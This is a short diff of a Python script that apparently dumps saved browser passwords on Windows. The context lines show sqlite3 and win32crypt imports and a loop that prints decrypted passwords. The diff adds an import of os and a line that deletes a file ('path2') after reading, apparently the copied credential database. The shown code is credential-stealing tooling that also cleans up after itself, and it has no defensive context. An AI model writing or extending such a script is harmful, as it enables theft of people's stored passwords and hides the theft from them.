@@ -1,3 +1,4 @@
+import os
 from os import getenv
 import sqlite3
 import win32crypt
@@ -19,3 +20,4 @@ for raw in cursor.fetchall():
     print(password.decode())
 
 conn.close()
+os.remove(path2)
